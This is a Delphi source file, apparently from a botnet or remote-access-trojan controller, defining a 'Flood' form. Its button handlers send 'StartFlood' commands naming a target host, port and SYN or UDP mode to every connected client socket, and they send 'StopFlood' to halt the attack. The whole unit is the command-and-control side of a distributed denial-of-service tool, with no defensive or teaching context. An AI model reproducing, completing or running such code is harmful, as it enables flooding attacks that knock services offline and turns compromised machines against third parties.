unit uFlood;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ExtCtrls, ComCtrls, StdCtrls, Buttons, PngBitBtn;

type
  TFrmFlood = class(TForm)
    PageControl1: TPageControl;
    GroupBox1: TGroupBox;
    Label1: TLabel;
    edtHost: TEdit;
    btnFlood: TPngBitBtn;
    btnStopFlood: TPngBitBtn;
    chkTCP: TRadioButton;
    chkUDP: TRadioButton;
    edtPort: TEdit;
    Label2: TLabel;
    procedure btnFloodClick(Sender: TObject);
    procedure btnStopFloodClick(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  FrmFlood: TFrmFlood;

implementation

uses uGeneral, uWeb;

{$R *.dfm}

procedure TFrmFlood.btnFloodClick(Sender: TObject);
var
  i :Integer;
begin
  for i := 0 to (FrmGeneral.ListUsers.Items.Count-1) do
  begin
    FrmGeneral.Server.Socket.Connections[i].SendText('StopFlood');
    if chkTCP.Checked then
      FrmGeneral.Server.Socket.Connections[i].SendText('StartFlood|'+ResolveDomain(edtHost.Text)+'|SYN|'+edtPort.Text)
    else
      FrmGeneral.Server.Socket.Connections[i].SendText('StartFlood|'+ResolveDomain(edtHost.Text)+'|UDP|'+edtPort.Text);
  end;
  MessageBoxA(0, PChar('Flood started!'), 'Information', 64);
end;

procedure TFrmFlood.btnStopFloodClick(Sender: TObject);
var
  i :Integer;
begin
  for i := 0 to (FrmGeneral.ListUsers.Items.Count-1) do
  begin
    FrmGeneral.Server.Socket.Connections[i].SendText('StopFlood');
  end;
  MessageBoxA(0, PChar('Flood stop!'), 'Information', 64);
end;

end.
